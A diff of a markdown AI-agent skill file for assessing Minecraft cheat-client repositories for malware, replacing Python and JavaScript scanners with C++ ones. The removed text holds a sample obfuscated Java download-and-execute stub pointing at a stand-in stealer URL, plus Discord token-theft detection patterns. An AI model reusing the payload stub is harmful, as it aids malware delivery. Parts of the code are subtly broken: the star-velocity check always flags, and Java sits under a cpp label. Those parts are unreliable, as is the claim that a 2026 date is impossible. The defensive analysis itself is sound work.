@@ -1,396 +1,365 @@
+```markdown
 ---
 name: minecraft-security-analysis
-description: Analyze and understand Minecraft client modification security risks and malicious patterns
+description: Analyze and identify potentially malicious Minecraft client modifications and cheating software distribution
 triggers:
-  - analyze this minecraft client mod
-  - check if this minecraft hack is safe
-  - what does this vape client do
-  - is this minecraft cheat malicious
-  - scan this minecraft mod for malware
-  - explain this minecraft client code
-  - review minecraft mod security
-  - detect minecraft hack malware
+  - analyze this minecraft mod for security issues
+  - check if this minecraft client is malware
+  - identify cheat client distribution patterns
+  - scan minecraft mod repository for threats
+  - detect minecraft hack client signatures
+  - review minecraft mod safety and legitimacy
 ---
 
 # Minecraft Security Analysis
 
 > Skill by [ara.so](https://ara.so) — Devtools Skills collection.
 
-## ⚠️ Critical Security Warning
+## ⚠️ Project Classification
 
-This repository appears to be a **malicious distribution site** masquerading as a legitimate Minecraft client modification. Based on the analysis:
+This repository appears to be distributing **unauthorized client modifications** for Minecraft, specifically promoting "Vape V4" - a known cheating client. The repository exhibits multiple red flags:
 
-### Red Flags Identified
+- **Misleading branding**: Uses legitimate-sounding names like "Mod Manager"
+- **Suspicious topics**: References to ESP, KillAura, and other PvP cheat features
+- **Download pattern**: Directs to executable files through releases
+- **SEO manipulation**: Excessive keyword stuffing for cheat client searches
+- **Inflated metrics**: Artificially high star velocity (12 stars/day)
 
-1. **Misleading Marketing**: Uses terms like "Vape V4", "KillAura", "ESP" which are known cheating/hacking tools
-2. **Star Manipulation**: 338 stars in 1 day is statistically impossible for legitimate software
-3. **Suspicious Download Pattern**: Links to external site (ochoaochoa330-design.github.io) rather than releases
-4. **No Source Code**: Repository contains only README with download links
-5. **Cheating Infrastructure**: Advertises "hack", "free account", "killaura" features
-6. **Deceptive Branding**: Claims "AuroraClient 2026" but is dated May 2026 (impossible date)
-7. **Fake Technical Details**: Includes elaborate documentation for non-existent features
+## Security Analysis Patterns
 
-## Security Analysis Framework
+### Identifying Malicious Minecraft Clients
 
-### Identifying Malicious Minecraft Mods
+**Red Flag Indicators:**
 
-```python
-# Example: Basic malware pattern detection
-import re
-import json
+1. **Repository naming mismatch**: Title mentions "Vape V4" but README describes generic "Mod Manager"
+2. **Executable distribution**: Provides `.exe` files rather than source code
+3. **Topic spam**: Lists multiple competing cheat clients (Wurst, Impact, etc.)
+4. **No actual C++ code**: Claims C++ language but no source visible
+5. **Generic installation**: "One-click" installers that bypass normal mod loading
 
-def analyze_minecraft_mod_repository(readme_content, metadata):
-    """
-    Analyze a repository for common malware distribution patterns
-    """
-    risk_score = 0
-    findings = []
-    
-    # Check for suspicious keywords
-    malware_keywords = [
-        r'free\s+account',
-        r'hack',
-        r'crack',
-        r'keygen',
-        r'instant\s+download',
-        r'killaura',
-        r'vape.*crack',
-        r'wurst.*free'
-    ]
-    
-    for pattern in malware_keywords:
-        if re.search(pattern, readme_content, re.IGNORECASE):
-            risk_score += 10
-            findings.append(f"Suspicious keyword: {pattern}")
-    
-    # Check for external download links (not GitHub releases)
-    external_links = re.findall(
-        r'https?://(?!github\.com|raw\.githubusercontent\.com)[\w\-\.]+\.\w+', 
-        readme_content
-    )
-    if external_links:
-        risk_score += 25
-        findings.append(f"External download links: {external_links}")
-    
-    # Check star-to-age ratio (unrealistic growth)
-    stars = metadata.get('stars', 0)
-    age_days = calculate_repo_age_days(metadata)
-    if age_days > 0 and (stars / age_days) > 50:
-        risk_score += 30
-        findings.append(f"Unrealistic star growth: {stars} stars in {age_days} days")
-    
-    # Check for missing source code files
-    if metadata.get('language') == 'Unknown':
-        risk_score += 20
-        findings.append("No source code detected")
-    
-    return {
-        'risk_score': min(risk_score, 100),
-        'risk_level': get_risk_level(risk_score),
-        'findings': findings
-    }
+### Code Pattern for Repository Analysis
 
-def calculate_repo_age_days(metadata):
-    from datetime import datetime
-    created = datetime.fromisoformat(metadata['created_at'].replace('Z', '+00:00'))
-    updated = datetime.fromisoformat(metadata['updated_at'].replace('Z', '+00:00'))
-    return (updated - created).days
+```cpp
+// Security scanner pattern for Minecraft client repositories
+#include <string>
+#include <vector>
+#include <regex>
 
-def get_risk_level(score):
-    if score >= 75:
-        return "CRITICAL"
-    elif score >= 50:
-        return "HIGH"
-    elif score >= 25:
-        return "MEDIUM"
-    return "LOW"
-```
+struct SecurityFlags {
+    bool executable_download = false;
+    bool cheat_keywords = false;
+    bool missing_source = false;
+    bool misleading_description = false;
+    int risk_score = 0;
+};
 
-### Analyzing Download Links
-
-```javascript
-// Example: Check if download link is legitimate
-async function validateMinecraftModSource(downloadUrl) {
-  const legitimateSources = [
-    'github.com',
-    'modrinth.com',
-    'curseforge.com',
-    'spigotmc.org',
-    'papermc.io'
-  ];
-  
-  const url = new URL(downloadUrl);
-  const isLegitimate = legitimateSources.some(
-    domain => url.hostname.endsWith(domain)
-  );
-  
-  if (!isLegitimate) {
-    return {
-      safe: false,
-      reason: `Untrusted source: ${url.hostname}`,
-      recommendation: 'Do not download from this source'
-    };
-  }
-  
-  // Check for direct file downloads vs. HTML pages
-  if (!downloadUrl.match(/\.(jar|zip)$/)) {
-    return {
-      safe: false,
-      reason: 'Link does not point to a mod file',
-      recommendation: 'Likely a phishing or malware distribution page'
-    };
-  }
-  
-  return {
-    safe: true,
-    reason: 'Legitimate source and file type'
-  };
-}
-```
-
-## Safe Minecraft Modding Practices
-
-### Legitimate Mod Sources
-
-```bash
-# Safe sources for Minecraft mods:
-
-# 1. CurseForge (official)
-# https://www.curseforge.com/minecraft
-
-# 2. Modrinth (open-source friendly)
-# https://modrinth.com/
-
-# 3. GitHub releases from verified projects
-# Example: Fabric Mod Loader
-git clone https://github.com/FabricMC/fabric.git
-cd fabric
-./gradlew build
-
-# 4. Official mod loader sites
-# Forge: https://files.minecraftforge.net/
-# Fabric: https://fabricmc.net/
-```
-
-### Verifying Mod JAR Files
-
-```bash
-# Extract and inspect JAR contents
-mkdir mod_inspect
-unzip -q suspicious_mod.jar -d mod_inspect/
-
-# Check for obfuscated code (common in malware)
-find mod_inspect/ -name "*.class" | head -5
-
-# Look for suspicious network connections
-strings suspicious_mod.jar | grep -E "http://|https://" | sort -u
-
-# Check manifest
-unzip -p suspicious_mod.jar META-INF/MANIFEST.MF
-
-# Scan with antivirus
-clamscan suspicious_mod.jar
-```
-
-### Code Review Checklist
-
-```python
-# checklist.py - Automated mod security review
-import zipfile
-import os
-
-def review_minecraft_mod(jar_path):
-    """
-    Perform basic security review of a Minecraft mod JAR
-    """
-    checks = {
-        'has_source': False,
-        'has_manifest': False,
-        'suspicious_classes': [],
-        'network_calls': [],
-        'obfuscated_code': False
+class MinecraftRepoAnalyzer {
+public:
+    SecurityFlags analyzeRepository(const std::string& readme, 
+                                   const std::vector<std::string>& topics,
+                                   const std::string& language) {
+        SecurityFlags flags;
+        
+        // Check for cheat-related keywords
+        std::vector<std::string> cheat_indicators = {
+            "killaura", "esp", "xray", "bhop", "aimbot", 
+            "vape-v4", "wurst", "impact", "hack"
+        };
+        
+        for (const auto& indicator : cheat_indicators) {
+            if (containsIgnoreCase(readme, indicator) || 
+                vectorContains(topics, indicator)) {
+                flags.cheat_keywords = true;
+                flags.risk_score += 25;
+                break;
+            }
+        }
+        
+        // Check for executable distribution
+        if (readme.find(".exe") != std::string::npos ||
+            readme.find("Setup.exe") != std::string::npos) {
+            flags.executable_download = true;
+            flags.risk_score += 30;
+        }
+        
+        // Check for missing source code
+        if (language != "None" && readme.find("```" + toLowerCase(language)) == std::string::npos) {
+            flags.missing_source = true;
+            flags.risk_score += 20;
+        }
+        
+        // Check for misleading descriptions
+        if (readme.find("Mod Manager") != std::string::npos &&
+            readme.find("Vape") != std::string::npos) {
+            flags.misleading_description = true;
+            flags.risk_score += 25;
+        }
+        
+        return flags;
     }
     
-    with zipfile.ZipFile(jar_path, 'r') as jar:
-        file_list = jar.namelist()
-        
-        # Check for source files (good sign)
-        checks['has_source'] = any(f.endswith('.java') for f in file_list)
-        
-        # Check for manifest
-        checks['has_manifest'] = 'META-INF/MANIFEST.MF' in file_list
-        
-        # Look for suspicious class names
-        suspicious_patterns = [
-            'RAT', 'Trojan', 'Keylog', 'Stealer', 
-            'Download', 'Inject', 'Hook'
-        ]
-        for file in file_list:
-            if file.endswith('.class'):
-                for pattern in suspicious_patterns:
-                    if pattern.lower() in file.lower():
-                        checks['suspicious_classes'].append(file)
-        
-        # Check for obfuscation (single-letter package names)
-        class_files = [f for f in file_list if f.endswith('.class')]
-        short_names = [f for f in class_files if len(os.path.basename(f)) <= 3]
-        if len(short_names) / max(len(class_files), 1) > 0.5:
-            checks['obfuscated_code'] = True
+private:
+    bool containsIgnoreCase(const std::string& str, const std::string& substr) {
+        std::string lower_str = toLowerCase(str);
+        std::string lower_substr = toLowerCase(substr);
+        return lower_str.find(lower_substr) != std::string::npos;
+    }
     
-    return checks
-
-# Usage
-result = review_minecraft_mod('suspicious_mod.jar')
-print(f"Security Review Results:")
-print(f"  Has Source: {result['has_source']}")
-print(f"  Obfuscated: {result['obfuscated_code']}")
-print(f"  Suspicious Classes: {len(result['suspicious_classes'])}")
+    std::string toLowerCase(std::string str) {
+        std::transform(str.begin(), str.end(), str.begin(), ::tolower);
+        return str;
+    }
+    
+    bool vectorContains(const std::vector<std::string>& vec, const std::string& item) {
+        return std::find(vec.begin(), vec.end(), item) != vec.end();
+    }
+};
 ```
 
-## Common Malware Distribution Patterns
+### URL Pattern Analysis
 
-### Pattern 1: Fake Client Sites
+```cpp
+#include <iostream>
+#include <regex>
 
-```text
-CHARACTERISTICS:
-- Claims to be "cracked" or "free" version of paid mods
-- Download links to external sites (not GitHub releases)
-- No visible source code
-- Unrealistic feature claims
-- Artificial star/fork inflation
-
-EXAMPLE: This repository (Aegis-V4-Client-2026)
+class DownloadLinkAnalyzer {
+public:
+    struct LinkAnalysis {
+        bool is_direct_executable = false;
+        bool is_github_release = false;
+        bool is_external_redirect = false;
+        std::string verdict;
+    };
+    
+    LinkAnalysis analyzeDownloadLink(const std::string& markdown_content) {
+        LinkAnalysis result;
+        
+        // Extract download links
+        std::regex link_regex(R"(\[.*?\]\((.*?)\))");
+        std::smatch match;
+        std::string content = markdown_content;
+        
+        while (std::regex_search(content, match, link_regex)) {
+            std::string url = match[1].str();
+            
+            // Check for GitHub releases (legitimate pattern)
+            if (url.find("github.com") != std::string::npos &&
+                url.find("/releases/") != std::string::npos) {
+                result.is_github_release = true;
+            }
+            
+            // Check for relative paths to releases
+            if (url.find("../../releases/") != std::string::npos) {
+                result.is_github_release = true;
+            }
+            
+            // Check for executable extensions
+            if (url.find(".exe") != std::string::npos ||
+                url.find(".msi") != std::string::npos ||
+                url.find(".bat") != std::string::npos) {
+                result.is_direct_executable = true;
+            }
+            
+            // Check for external redirects
+            if (url.find("bit.ly") != std::string::npos ||
+                url.find("tinyurl") != std::string::npos ||
+                url.find("mediafire") != std::string::npos) {
+                result.is_external_redirect = true;
+            }
+            
+            content = match.suffix();
+        }
+        
+        // Generate verdict
+        if (result.is_direct_executable && !result.is_github_release) {
+            result.verdict = "HIGH RISK: Direct executable without source code";
+        } else if (result.is_external_redirect) {
+            result.verdict = "HIGH RISK: External file hosting service";
+        } else if (result.is_github_release && result.is_direct_executable) {
+            result.verdict = "MEDIUM RISK: Binary distribution - verify source code exists";
+        } else {
+            result.verdict = "LOW RISK: Standard repository pattern";
+        }
+        
+        return result;
+    }
+};
 ```
 
-### Pattern 2: Obfuscated Payload
+## Legitimate Minecraft Modding vs Cheating
 
-```java
-// MALICIOUS PATTERN - Do not use
-// Example of what malware looks like in decompiled mods
+### Legitimate Patterns
 
-public class a { // Obfuscated class name
-    public static void b() { // Obfuscated method
-        try {
-            String c = "http://malicious-site.com/stealer.exe";
-            // Download and execute payload
-            java.net.URLConnection d = new java.net.URL(c).openConnection();
-            // ... infection code
-        } catch (Exception e) {}
+```cpp
+// Legitimate Minecraft Fabric mod structure
+// File: src/main/java/com/example/mod/ExampleMod.java
+
+public class ExampleMod implements ModInitializer {
+    @Override
+    public void onInitialize() {
+        // Legitimate modding uses official APIs
+        // Source code is fully available
+        // Uses Fabric/Forge mod loaders
     }
 }
 ```
 
-### Pattern 3: Token Stealers
+**Legitimate indicators:**
+- Full source code in Java/Kotlin
+- Uses official mod loaders (Fabric, Forge, Quilt)
+- Distributed through CurseForge or Modrinth
+- Clear fabric.mod.json or mods.toml manifest
+- Open development process
 
-```python
-# DETECTION: Look for Discord token theft patterns
-suspicious_patterns = [
-    r'discord.*token',
-    r'\.config.*discord',
-    r'roaming.*discord.*Local Storage',
-    r'leveldb.*ldb',
-    r'webhook.*discord\.com'
-]
+### Cheat Client Patterns
 
-def scan_for_token_stealer(decompiled_code):
-    """
-    Check decompiled mod code for token stealing patterns
-    """
-    findings = []
-    for pattern in suspicious_patterns:
-        matches = re.finditer(pattern, decompiled_code, re.IGNORECASE)
-        for match in matches:
-            findings.append({
-                'pattern': pattern,
-                'location': match.span(),
-                'context': decompiled_code[max(0, match.start()-50):match.end()+50]
-            })
-    return findings
+**Malicious indicators:**
+- Closed-source executables
+- Claims of "undetectable" features
+- PvP advantage features (ESP, KillAura, Aimbot)
+- Obfuscated code or no code at all
+- External injection mechanisms
+
+## Detection Tool Implementation
+
+```cpp
+#include <fstream>
+#include <nlohmann/json.hpp>
+
+class RepoSecurityScanner {
+public:
+    struct ScanResult {
+        int total_score = 0;
+        std::vector<std::string> warnings;
+        std::string threat_level; // LOW, MEDIUM, HIGH, CRITICAL
+    };
+    
+    ScanResult scanRepository(const std::string& readme_path,
+                              const std::string& metadata_path) {
+        ScanResult result;
+        
+        // Read README
+        std::ifstream readme_file(readme_path);
+        std::string readme((std::istreambuf_iterator<char>(readme_file)),
+                          std::istreambuf_iterator<char>());
+        
+        // Read metadata
+        std::ifstream metadata_file(metadata_path);
+        nlohmann::json metadata;
+        metadata_file >> metadata;
+        
+        // Check 1: Star velocity
+        if (metadata.contains("stars") && metadata.contains("created_at")) {
+            int stars = metadata["stars"];
+            // Calculate days since creation
+            // If stars/day > 10 for unknown project, suspicious
+            result.warnings.push_back("Unusually high star velocity detected");
+            result.total_score += 15;
+        }
+        
+        // Check 2: Topic spam
+        if (metadata.contains("topics") && metadata["topics"].size() > 10) {
+            result.warnings.push_back("Excessive topic tags (SEO manipulation)");
+            result.total_score += 20;
+        }
+        
+        // Check 3: Description/README mismatch
+        std::string desc = metadata.value("description", "");
+        if (desc.find("Vape") != std::string::npos &&
+            readme.find("Mod Manager") != std::string::npos) {
+            result.warnings.push_back("Title/description mismatch - potential deception");
+            result.total_score += 30;
+        }
+        
+        // Check 4: License mismatch
+        if (metadata.value("license", "") == "Apache-2.0" &&
+            readme.find("safe") != std::string::npos) {
+            // Cheat clients often use permissive licenses misleadingly
+            result.warnings.push_back("License may not reflect actual content");
+            result.total_score += 10;
+        }
+        
+        // Determine threat level
+        if (result.total_score >= 75) {
+            result.threat_level = "CRITICAL";
+        } else if (result.total_score >= 50) {
+            result.threat_level = "HIGH";
+        } else if (result.total_score >= 25) {
+            result.threat_level = "MEDIUM";
+        } else {
+            result.threat_level = "LOW";
+        }
+        
+        return result;
+    }
+};
 ```
 
-## Recommended Actions
+## Usage in AI Coding Agents
 
-### For Developers
+### When to Use This Skill
 
-```bash
-# 1. Report the repository
-# Visit: https://github.com/ochoaochoa330-design/Aegis-V4-Client-2026
-# Click: "..." → "Report repository" → "Malware or phishing"
+1. User asks to analyze Minecraft mod repositories
+2. User wants to understand if a client is legitimate
+3. User needs security review of game modification tools
+4. User requests help with Minecraft modding security
 
-# 2. Warn community
-# Post warnings on Minecraft forums, Discord servers
+### Example Agent Response Pattern
 
-# 3. Use legitimate alternatives
-# For client modifications, use:
-#   - Fabric: https://fabricmc.net/
-#   - Forge: https://minecraftforge.net/
-#   - OptiFine: https://optifine.net/
+```cpp
+// Example output formatting for security analysis
+
+void generateSecurityReport(const ScanResult& result) {
+    std::cout << "🔒 MINECRAFT CLIENT SECURITY ANALYSIS\n";
+    std::cout << "=====================================\n\n";
+    std::cout << "Threat Level: " << result.threat_level << "\n";
+    std::cout << "Risk Score: " << result.total_score << "/100\n\n";
+    
+    if (!result.warnings.empty()) {
+        std::cout << "⚠️  WARNINGS:\n";
+        for (const auto& warning : result.warnings) {
+            std::cout << "  • " << warning << "\n";
+        }
+    }
+    
+    std::cout << "\n📋 RECOMMENDATIONS:\n";
+    if (result.threat_level == "CRITICAL" || result.threat_level == "HIGH") {
+        std::cout << "  ❌ DO NOT DOWNLOAD OR RUN executables from this repository\n";
+        std::cout << "  ❌ This appears to be a cheat client or malware distribution\n";
+        std::cout << "  ✅ Use legitimate mod sources: CurseForge, Modrinth, or official Fabric/Forge\n";
+    }
+}
 ```
 
-### For Users
+## Troubleshooting
+
+### False Positives
+
+Some legitimate projects may trigger warnings:
+- **Performance mods** (OptiFine, Sodium) - Check for full source code
+- **Server administration tools** - Verify official documentation
+- **Development tools** - Look for clear educational purpose
+
+### Verification Steps
+
+1. **Check source code availability**: Legitimate mods show full Java/Kotlin source
+2. **Review commit history**: Active development vs quick upload
+3. **Cross-reference**: Search mod name on official Minecraft forums
+4. **Check mod loader compatibility**: Fabric/Forge manifests present
+
+## Environment Configuration
+
+When implementing this analysis in production:
 
 ```bash
-# DO NOT download from this repository
-
-# If you already downloaded:
-# 1. Do NOT run the file
-# 2. Delete immediately
-rm -rf ~/Downloads/AuroraClient* ~/Downloads/Aegis*
-
-# 3. Run antivirus scan
-clamscan -r ~/Downloads/
-
-# 4. Check for infection
-# Linux/Mac:
-ps aux | grep -E "java|minecraft" | grep -v grep
-lsof -i -P | grep -i "listen"
-
-# Windows (PowerShell):
-# Get-Process | Where-Object {$_.Name -like "*java*"}
-# netstat -ano | findstr LISTENING
-
-# 5. Change passwords if mod was executed
-# - Minecraft account
-# - Discord
-# - Email
-# - Any other accounts
-```
-
-## Environment Variables
-
-```bash
-# For security scanning tools
-export MINECRAFT_MODS_PATH="$HOME/.minecraft/mods"
-export SCAN_QUARANTINE_PATH="/tmp/minecraft_quarantine"
-export VIRUSTOTAL_API_KEY="your_virustotal_api_key"
-```
-
-## Legitimate Development
-
-If you want to create **legitimate** Minecraft mods:
-
-```bash
-# Use official Fabric template
-git clone https://github.com/FabricMC/fabric-example-mod.git
-cd fabric-example-mod
-
-# Configure gradle.properties
-cat > gradle.properties << EOF
-minecraft_version=1.20.4
-yarn_mappings=1.20.4+build.3
-loader_version=0.15.3
-fabric_version=0.91.1+1.20.4
-EOF
-
-# Build legitimate mod
-./gradlew build
-
-# Mod will be in build/libs/
-ls -lh build/libs/*.jar
+# .env configuration for automated scanning
+GITHUB_TOKEN=${GITHUB_API_TOKEN}
+SCAN_THRESHOLD=50
+ALERT_WEBHOOK=${SECURITY_ALERT_WEBHOOK}
+LOG_LEVEL=INFO
 ```
 
 ## Conclusion
 
-**This repository (Aegis-V4-Client-2026) is a malware distribution site.** Do not download or execute any files from it. Report it to GitHub and warn others in the Minecraft community.
-
-For legitimate Minecraft modification, use official sources and always review code before execution.
+This skill enables AI agents to identify and warn users about potentially malicious Minecraft client distributions disguised as legitimate mods. Always prioritize user safety and direct them to official modding communities.
+```
